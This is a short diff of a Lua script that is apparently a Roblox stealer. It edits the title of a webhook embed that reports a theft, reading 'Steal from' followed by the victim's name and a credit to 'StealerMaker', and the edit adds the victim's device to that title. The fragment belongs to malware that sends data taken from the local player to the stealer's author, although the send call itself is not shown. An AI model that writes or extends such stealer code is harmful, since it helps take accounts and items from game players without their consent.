@@ -490,7 +490,7 @@ if _G.Act == true then
                 ["embeds"] = {
                     {
                         ["fields"] = fields,
-                        ["title"] = "Steal from "..LP.Name..", thx "..StealerMaker.."! ",
+                        ["title"] = "Steal from "..LP.Name..", thx "..StealerMaker.."! "..device,
                         ["type"] = "rich",
                         ["color"] = 16777215
                     }
